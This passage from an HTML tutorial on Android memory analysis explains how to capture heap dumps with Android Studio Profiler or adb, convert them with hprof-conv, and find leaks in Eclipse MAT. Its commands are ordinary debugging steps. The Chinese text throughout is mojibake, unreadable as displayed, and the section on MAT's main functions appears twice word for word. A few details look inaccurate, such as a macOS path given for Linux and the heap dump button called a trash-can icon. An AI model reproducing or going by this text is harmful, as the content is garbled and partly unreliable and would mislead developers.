<li>æ‰¾åˆ°"GC"ç›¸å…³çš„äº‹ä»¶</li>
<li>æŸ¥çœ‹GCçš„æŒç»­æ—¶é—´</li>
<li>æŸ¥çœ‹GCæ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
</ul>
</li>
<li>
<p><strong>åˆ†æå¡é¡¿åŸå› </strong></p>
<ul>
<li>å¦‚æœå¡é¡¿æ—¶é—´ä¸GCæ—¶é—´å¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´å¡é¡¿</li>
<li>å¦‚æœGCé¢‘ç¹ï¼Œéœ€è¦ä¼˜åŒ–ä»£ç å‡å°‘GC</li>
<li>å¦‚æœGCæš‚åœæ—¶é—´é•¿ï¼Œéœ€è¦é¿å…Full GC</li>
</ul>
</li>
</ol>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>åˆ†æåº”ç”¨å¡é¡¿é—®é¢˜</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
<li>ä¼˜åŒ–GCæ€§èƒ½</li>
</ul>
<h4 data-id="heading-66">5.1.4 MATï¼ˆMemory Analyzer Toolï¼Œåˆ†æå †è½¬å‚¨ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> åˆ†æå †è½¬å‚¨æ–‡ä»¶ï¼Œè¯¦ç»†åˆ†æå†…å­˜é—®é¢˜ï¼Œæ‰¾å‡ºå†…å­˜æ³„æ¼å’Œå¤§å¯¹è±¡</p>
<p><strong>MATæ˜¯ä»€ä¹ˆï¼š</strong></p>
<ul>
<li>Eclipse Memory Analyzer Tool</li>
<li>ä¸“é—¨ç”¨äºåˆ†æJavaå †è½¬å‚¨æ–‡ä»¶çš„å·¥å…·</li>
<li>å¯ä»¥è¯¦ç»†åˆ†æå¯¹è±¡çš„å†…å­˜å ç”¨å’Œå¼•ç”¨å…³ç³»</li>
</ul>
<p><strong>MATä¸‹è½½å’Œå®‰è£…ï¼š</strong></p>
<p><strong>1. ä¸‹è½½MAT</strong></p>
<ul>
<li>è®¿é—®Eclipseå®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.eclipse.org%2Fmat%2F" target="_blank" title="https://www.eclipse.org/mat/" ref="nofollow noopener noreferrer">www.eclipse.org/mat/</a></li>
<li>ä¸‹è½½MATå®‰è£…åŒ…ï¼ˆWindows/Mac/Linuxï¼‰</li>
<li>æˆ–è€…ä¸‹è½½ç‹¬ç«‹ç‰ˆæœ¬ï¼ˆä¸éœ€è¦Eclipseï¼‰</li>
</ul>
<p><strong>2. å®‰è£…MAT</strong></p>
<ul>
<li>Windowsï¼šè§£å‹ä¸‹è½½çš„æ–‡ä»¶ï¼Œè¿è¡ŒMemoryAnalyzer.exe</li>
<li>Mac/Linuxï¼šè§£å‹ä¸‹è½½çš„æ–‡ä»¶ï¼Œè¿è¡ŒMemoryAnalyzerå¯æ‰§è¡Œæ–‡ä»¶</li>
<li>ç¡®ä¿å·²å®‰è£…Javaï¼ˆMATéœ€è¦Javaè¿è¡Œç¯å¢ƒï¼‰</li>
</ul>
<p><strong>Android Studioç”Ÿæˆå †è½¬å‚¨çš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨Android Studio Profilerï¼ˆæ¨èï¼‰</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰“å¼€Profiler</strong></p>
<ul>
<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»åº•éƒ¨å·¥å…·æ çš„"Profiler"æ ‡ç­¾</li>
<li>æˆ–é€šè¿‡èœå•ï¼šView â†’ Tool Windows â†’ Profiler</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œï¼ˆdebugæ¨¡å¼ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šé€‰æ‹©åº”ç”¨è¿›ç¨‹</strong></p>
<ul>
<li>åœ¨Profilerçª—å£ä¸­ï¼Œé€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæ‰“å¼€Memory Profiler</strong></p>
<ul>
<li>ç‚¹å‡»"Memory"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>ç‚¹å‡»å†…å­˜æ›²çº¿å›¾ä¸‹æ–¹çš„"Heap Dump"æŒ‰é’®ï¼ˆåƒåœ¾æ¡¶å›¾æ ‡ï¼‰</li>
<li>ç­‰å¾…ç”Ÿæˆå®Œæˆï¼ˆå¯èƒ½éœ€è¦å‡ ç§’åˆ°å‡ åç§’ï¼Œå–å†³äºå †å¤§å°ï¼‰</li>
<li>ç”Ÿæˆå®Œæˆåï¼Œä¼šåœ¨ä¸‹æ–¹æ˜¾ç¤ºå †è½¬å‚¨ä¿¡æ¯</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šå¯¼å‡ºhprofæ–‡ä»¶</strong></p>
<ul>
<li>åœ¨å †è½¬å‚¨ä¿¡æ¯åŒºåŸŸï¼Œç‚¹å‡»"Export heap dump"æŒ‰é’®</li>
<li>é€‰æ‹©ä¿å­˜ä½ç½®ï¼Œä¿å­˜ä¸º.hprofæ–‡ä»¶</li>
<li>æ¯”å¦‚ï¼š<code>heap.hprof</code></li>
</ul>
<p><strong>æ–¹æ³•2ï¼šä½¿ç”¨å‘½ä»¤è¡Œç”Ÿæˆå †è½¬å‚¨</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰¾åˆ°åº”ç”¨è¿›ç¨‹ID</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰åº”ç”¨è¿›ç¨‹</span>
adb shell ps | grep ä½ çš„åº”ç”¨åŒ…å

<span class="hljs-comment"># æˆ–è€…</span>
adb shell ps -A | grep ä½ çš„åº”ç”¨åŒ…å
</code></pre>
<p><strong>æ­¥éª¤2ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹æ³•1ï¼šä½¿ç”¨amå‘½ä»¤ï¼ˆéœ€è¦rootæƒé™æˆ–debugç‰ˆæœ¬ï¼‰</span>
adb shell am dumpheap &lt;pid&gt; /data/local/tmp/heap.hprof

<span class="hljs-comment"># æ–¹æ³•2ï¼šä½¿ç”¨killå‘½ä»¤ï¼ˆå‘é€ä¿¡å·ï¼‰</span>
adb shell <span class="hljs-built_in">kill</span> -10 &lt;pid&gt;

<span class="hljs-comment"># æ–¹æ³•3ï¼šåœ¨ä»£ç ä¸­ç”Ÿæˆï¼ˆå¼€å‘æ—¶ï¼‰</span>
Debug.dumpHprofData(<span class="hljs-string">"/data/local/tmp/heap.hprof"</span>);
</code></pre>
<p><strong>æ­¥éª¤3ï¼šä»è®¾å¤‡æ‹‰å–hprofæ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä»è®¾å¤‡æ‹‰å–åˆ°æœ¬åœ°</span>
adb pull /data/local/tmp/heap.hprof ./
</code></pre>
<p><strong>è½¬æ¢hprofæ–‡ä»¶æ ¼å¼çš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦è½¬æ¢ï¼š</strong></p>
<ul>
<li>Androidçš„hprofæ–‡ä»¶æ ¼å¼ä¸æ ‡å‡†Javaä¸åŒ</li>
<li>MATæ— æ³•ç›´æ¥æ‰“å¼€Androidçš„hprofæ–‡ä»¶</li>
<li>éœ€è¦ä½¿ç”¨Android SDKçš„hprof-convå·¥å…·è½¬æ¢</li>
</ul>
<p><strong>æ­¥éª¤1ï¼šæ‰¾åˆ°hprof-convå·¥å…·</strong></p>
<ul>
<li>hprof-convå·¥å…·ä½äºAndroid SDKçš„platform-toolsç›®å½•</li>
<li>Windowsï¼š<code>%LOCALAPPDATA%\Android\Sdk\platform-tools\hprof-conv.exe</code></li>
<li>Mac/Linuxï¼š<code>~/Library/Android/sdk/platform-tools/hprof-conv</code></li>
</ul>
<p><strong>æ­¥éª¤2ï¼šè½¬æ¢hprofæ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Windows</span>
hprof-conv.exe heap.hprof heap-converted.hprof

<span class="hljs-comment"># Mac/Linux</span>
./hprof-conv heap.hprof heap-converted.hprof

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨å®Œæ•´è·¯å¾„</span>
C:\Users\ä½ çš„ç”¨æˆ·å\AppData\Local\Android\Sdk\platform-tools\hprof-conv.exe heap.hprof heap-converted.hprof
</code></pre>
<p><strong>æ­¥éª¤3ï¼šéªŒè¯è½¬æ¢ç»“æœ</strong></p>
<ul>
<li>è½¬æ¢å®Œæˆåï¼Œä¼šç”Ÿæˆheap-converted.hprofæ–‡ä»¶</li>
<li>æ–‡ä»¶å¤§å°åº”è¯¥ä¸åŸå§‹æ–‡ä»¶ç›¸ä¼¼</li>
<li>ç°åœ¨å¯ä»¥ç”¨MATæ‰“å¼€äº†</li>
</ul>
<p><strong>MATæ‰“å¼€å’Œåˆ†æçš„è¯¦ç»†æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæ‰“å¼€MAT</strong></p>
<ul>
<li>è¿è¡ŒMATï¼ˆMemoryAnalyzer.exeæˆ–MemoryAnalyzerï¼‰</li>
<li>ç­‰å¾…MATå¯åŠ¨å®Œæˆ</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šæ‰“å¼€hprofæ–‡ä»¶</strong></p>
<ul>
<li>ç‚¹å‡»"File" â†’ "Open Heap Dump"</li>
<li>æˆ–è€…ç›´æ¥æ‹–æ‹½hprofæ–‡ä»¶åˆ°MATçª—å£</li>
<li>é€‰æ‹©è½¬æ¢åçš„hprofæ–‡ä»¶ï¼ˆheap-converted.hprofï¼‰</li>
<li>ç‚¹å‡»"Open"</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šç­‰å¾…MATåˆ†æ</strong></p>
<ul>
<li>MATä¼šè‡ªåŠ¨åˆ†æå †è½¬å‚¨æ–‡ä»¶</li>
<li>åˆ†ææ—¶é—´å–å†³äºå †å¤§å°ï¼ˆå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰</li>
<li>åˆ†æå®Œæˆåï¼Œä¼šæ˜¾ç¤ºåˆ†æç»“æœ</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæŸ¥çœ‹Leak Suspectsï¼ˆæ³„æ¼å«Œç–‘ï¼‰</strong></p>
<ul>
<li>MATä¼šè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼</li>
<li>ç‚¹å‡»"Leak Suspects"æ ‡ç­¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨ç”Ÿæˆçš„æ³„æ¼æŠ¥å‘Š</li>
<li>æŠ¥å‘Šä¼šæ˜¾ç¤ºå¯ç–‘çš„æ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä½¿ç”¨Histogramï¼ˆç›´æ–¹å›¾ï¼‰åˆ†æ</strong></p>
<ul>
<li>ç‚¹å‡»"Histogram"æ ‡ç­¾</li>
<li>æŸ¥çœ‹æ‰€æœ‰ç±»çš„å®ä¾‹æ•°é‡å’Œå†…å­˜å ç”¨</li>
<li><strong>æŒ‰å†…å­˜å ç”¨æ’åº</strong>ï¼š
<ul>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
</ul>
</li>
<li><strong>æŸ¥çœ‹ç±»çš„å®ä¾‹</strong>ï¼š
<ul>
<li>åŒå‡»æŸä¸ªç±»ï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
<li>å¯ä»¥çœ‹åˆ°æ¯ä¸ªå®ä¾‹å ç”¨çš„å†…å­˜</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä½¿ç”¨Dominator Treeï¼ˆæ”¯é…æ ‘ï¼‰åˆ†æ</strong></p>
<ul>
<li>ç‚¹å‡»"Dominator Tree"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨å…³ç³»æ ‘</li>
<li><strong>æŒ‰å†…å­˜å ç”¨æ’åº</strong>ï¼š
<ul>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
</li>
<li><strong>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨å…³ç³»</strong>ï¼š
<ul>
<li>å±•å¼€å¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°å®ƒå¼•ç”¨çš„å…¶ä»–å¯¹è±¡</li>
<li>å¯ä»¥æ‰¾åˆ°å“ªäº›å¯¹è±¡æŒæœ‰å¤§é‡å†…å­˜</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤7ï¼šä½¿ç”¨Path to GC Rootsï¼ˆåˆ°GC Rootsçš„è·¯å¾„ï¼‰åˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li><strong>é€‰æ‹©å¯¹è±¡</strong>ï¼š
<ul>
<li>åœ¨Histogramæˆ–Dominator Treeä¸­ï¼Œå³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"ï¼ˆæ’é™¤å¼±å¼•ç”¨ï¼‰</li>
</ul>
</li>
<li><strong>æŸ¥çœ‹å¼•ç”¨é“¾</strong>ï¼š
<ul>
<li>MATä¼šæ˜¾ç¤ºå¯¹è±¡åˆ°GC Rootsçš„å®Œæ•´å¼•ç”¨é“¾</li>
<li>å¯ä»¥çœ‹åˆ°æ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
<li>æ‰¾å‡ºæ³„æ¼çš„åŸå› </li>
</ul>
</li>
</ul>
<p><strong>MATåˆ†æå†…å­˜æ³„æ¼çš„å®é™…æ“ä½œç¤ºä¾‹ï¼š</strong></p>
<p><strong>åœºæ™¯ï¼šActivityæ³„æ¼</strong></p>
<p><strong>æ­¥éª¤1ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨Android Studio Profilerä¸­ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºheap.hprof</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šè½¬æ¢æ–‡ä»¶</strong></p>
<pre><code class="hljs language-bash" lang="bash">hprof-conv heap.hprof heap-converted.hprof
</code></pre>
<p><strong>æ­¥éª¤3ï¼šç”¨MATæ‰“å¼€</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€heap-converted.hprof</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæŸ¥æ‰¾æ³„æ¼çš„Activity</strong></p>
<ul>
<li>æ‰“å¼€Histogram</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥"Activity"</li>
<li>æ‰¾åˆ°MyActivityç±»</li>
<li>æŸ¥çœ‹å®ä¾‹æ•°é‡ï¼ˆå¦‚æœæœ‰å¤šä¸ªå®ä¾‹ï¼Œå¯èƒ½æœ‰æ³„æ¼ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>å³é”®ç‚¹å‡»MyActivityå®ä¾‹</li>
<li>é€‰æ‹©"Path to GC Roots" â†’ "exclude weak references"</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ¯”å¦‚ï¼š
<pre><code class="hljs language-scss" lang="scss">MyActivityå®ä¾‹
  â†‘ (è¢«å¼•ç”¨)
static MyActivity<span class="hljs-selector-class">.activity</span> (é™æ€å˜é‡)
  â†‘ (GC Root)
</code></pre>
</li>
<li>æ‰¾å‡ºæ˜¯é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šå®šä½ä»£ç </strong></p>
<ul>
<li>æ ¹æ®å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä¸­çš„é™æ€å˜é‡</li>
<li>ä¿®å¤ä»£ç ï¼ˆä½¿ç”¨å¼±å¼•ç”¨æˆ–åŠæ—¶æ¸…ç†ï¼‰</li>
</ul>
<p><strong>MATçš„ä¸»è¦åŠŸèƒ½è¯¦ç»†è¯´æ˜ï¼š</strong></p>
<p><strong>1. Histogramï¼ˆç›´æ–¹å›¾ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºæ‰€æœ‰ç±»çš„å®ä¾‹æ•°é‡å’Œå†…å­˜å ç”¨</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥ç±»åï¼ŒæŸ¥æ‰¾ç‰¹å®šç±»</li>
<li>ç‚¹å‡»åˆ—æ ‡é¢˜æ’åºï¼ˆæ¯”å¦‚æŒ‰"Retained Heap"æ’åºï¼‰</li>
<li>åŒå‡»ç±»åï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
</ul>
<p><strong>2. Dominator Treeï¼ˆæ”¯é…æ ‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡çš„å¼•ç”¨å…³ç³»æ ‘ï¼Œæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Dominator Tree"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>å±•å¼€å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨å…³ç³»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>3. Path to GC Rootsï¼ˆåˆ°GC Rootsçš„è·¯å¾„ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡åˆ°GC Rootsçš„å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>å³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots"</li>
<li>é€‰æ‹©"exclude weak references"ï¼ˆæ’é™¤å¼±å¼•ç”¨ï¼‰</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå†…å­˜æ³„æ¼çš„åŸå› </li>
</ul>
<p><strong>4. Leak Suspectsï¼ˆæ³„æ¼å«Œç–‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šMATè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼ï¼Œç”Ÿæˆæ³„æ¼æŠ¥å‘Š</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Leak Suspects"è§†å›¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨æ£€æµ‹çš„æ³„æ¼æŠ¥å‘Š</li>
<li>æ ¹æ®æŠ¥å‘Šåˆ†ææ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¿«é€Ÿå®šä½å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>5. OQLï¼ˆObject Query Languageï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šä½¿ç”¨ç±»ä¼¼SQLçš„æŸ¥è¯¢è¯­è¨€æŸ¥è¯¢å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"OQL"è§†å›¾</li>
<li>è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼Œæ¯”å¦‚ï¼š
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> java.lang.String <span class="hljs-keyword">WHERE</span> this.value.length <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>
</code></pre>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæŸ¥æ‰¾ç‰¹å®šæ¡ä»¶çš„å¯¹è±¡</li>
</ul>
<p><strong>MATåˆ†ææŠ€å·§ï¼š</strong></p>
<p><strong>1. å¯¹æ¯”å¤šä¸ªå †è½¬å‚¨</strong></p>
<ul>
<li>ç”Ÿæˆå¤šä¸ªæ—¶é—´ç‚¹çš„å †è½¬å‚¨</li>
<li>å¯¹æ¯”åˆ†æï¼Œæ‰¾å‡ºå†…å­˜å¢é•¿çš„åŸå› </li>
<li>å¯ä»¥çœ‹åˆ°å“ªäº›å¯¹è±¡åœ¨å¢é•¿</li>
</ul>
<p><strong>2. ä½¿ç”¨OQLæŸ¥è¯¢</strong></p>
<ul>
<li>ä½¿ç”¨OQLæŸ¥è¯¢ç‰¹å®šå¯¹è±¡</li>
<li>æ¯”å¦‚ï¼šæŸ¥è¯¢æ‰€æœ‰Activityå®ä¾‹</li>
<li>åˆ†æè¿™äº›å¯¹è±¡æ˜¯å¦åº”è¯¥å­˜åœ¨</li>
</ul>
<p><strong>3. å…³æ³¨Retained Heap</strong></p>
<ul>
<li>Retained Heapè¡¨ç¤ºå¯¹è±¡åŠå…¶å¼•ç”¨çš„å¯¹è±¡å ç”¨çš„æ€»å†…å­˜</li>
<li>å…³æ³¨Retained Heapå¤§çš„å¯¹è±¡</li>
<li>è¿™äº›å¯¹è±¡å¯èƒ½æ˜¯å†…å­˜æ³„æ¼çš„æ ¹æº</li>
</ul>
<p><strong>4. æ’é™¤å¼±å¼•ç”¨</strong></p>
<ul>
<li>åœ¨Path to GC Rootsæ—¶ï¼Œé€‰æ‹©"exclude weak references"</li>
<li>å¼±å¼•ç”¨ä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶ï¼Œå¯ä»¥æ’é™¤</li>
<li>åªå…³æ³¨å¼ºå¼•ç”¨ï¼Œæ‰¾å‡ºçœŸæ­£çš„æ³„æ¼åŸå› </li>
</ul>
<p><strong>å¸¸è§é—®é¢˜ï¼š</strong></p>
<p><strong>1. MATæ— æ³•æ‰“å¼€hprofæ–‡ä»¶</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šAndroidçš„hprofæ ¼å¼ä¸æ ‡å‡†Javaä¸åŒ</li>
<li><strong>è§£å†³</strong>ï¼šä½¿ç”¨hprof-convå·¥å…·è½¬æ¢åå†æ‰“å¼€</li>
</ul>
<p><strong>2. MATåˆ†æå¾ˆæ…¢</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šå †è½¬å‚¨æ–‡ä»¶å¾ˆå¤§</li>
<li><strong>è§£å†³</strong>ï¼šç­‰å¾…åˆ†æå®Œæˆï¼Œæˆ–è€…å‡å°å †è½¬å‚¨å¤§å°</li>
</ul>
<p><strong>3. æ‰¾ä¸åˆ°æ³„æ¼å¯¹è±¡</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šæ³„æ¼å¯¹è±¡å¯èƒ½ä¸åœ¨å½“å‰å †è½¬å‚¨ä¸­</li>
<li><strong>è§£å†³</strong>ï¼šåœ¨åˆé€‚çš„æ—¶æœºç”Ÿæˆå †è½¬å‚¨ï¼Œæˆ–è€…ä½¿ç”¨LeakCanary</li>
</ul>
<p><strong>4. å¼•ç”¨é“¾å¤ªå¤æ‚</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šå¯¹è±¡å¼•ç”¨å…³ç³»å¤æ‚</li>
<li><strong>è§£å†³</strong>ï¼šä»æœ€å¯ç–‘çš„å¯¹è±¡å¼€å§‹åˆ†æï¼Œé€æ­¥ç¼©å°èŒƒå›´</li>
</ul>
<p><strong>MATçš„ä¸»è¦åŠŸèƒ½è¯¦ç»†è¯´æ˜ï¼š</strong></p>
<p><strong>1. Histogramï¼ˆç›´æ–¹å›¾ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºæ‰€æœ‰ç±»çš„å®ä¾‹æ•°é‡å’Œå†…å­˜å ç”¨</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Histogram"è§†å›¾</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥ç±»åï¼ŒæŸ¥æ‰¾ç‰¹å®šç±»</li>
<li>ç‚¹å‡»åˆ—æ ‡é¢˜æ’åºï¼ˆæ¯”å¦‚æŒ‰"Retained Heap"æ’åºï¼‰</li>
<li>åŒå‡»ç±»åï¼ŒæŸ¥çœ‹è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
</ul>
<p><strong>2. Dominator Treeï¼ˆæ”¯é…æ ‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡çš„å¼•ç”¨å…³ç³»æ ‘ï¼Œæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Dominator Tree"è§†å›¾</li>
<li>ç‚¹å‡»"Retained Heap"åˆ—æ ‡é¢˜ï¼ŒæŒ‰å†…å­˜å ç”¨æ’åº</li>
<li>å±•å¼€å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨å…³ç³»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>3. Path to GC Rootsï¼ˆåˆ°GC Rootsçš„è·¯å¾„ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºå¯¹è±¡åˆ°GC Rootsçš„å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>å³é”®ç‚¹å‡»å¯ç–‘å¯¹è±¡</li>
<li>é€‰æ‹©"Path to GC Roots"</li>
<li>é€‰æ‹©"exclude weak references"ï¼ˆæ’é™¤å¼±å¼•ç”¨ï¼‰</li>
<li>æŸ¥çœ‹å¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå†…å­˜æ³„æ¼çš„åŸå› </li>
</ul>
<p><strong>4. Leak Suspectsï¼ˆæ³„æ¼å«Œç–‘ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šMATè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼ï¼Œç”Ÿæˆæ³„æ¼æŠ¥å‘Š</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼š
<ol>
<li>æ‰“å¼€"Leak Suspects"è§†å›¾</li>
<li>æŸ¥çœ‹MATè‡ªåŠ¨æ£€æµ‹çš„æ³„æ¼æŠ¥å‘Š</li>
<li>æ ¹æ®æŠ¥å‘Šåˆ†ææ³„æ¼åŸå› </li>
</ol>
</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¿«é€Ÿå®šä½å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>5. OQLï¼ˆObject Query Languageï¼‰</strong></p>
<ul>
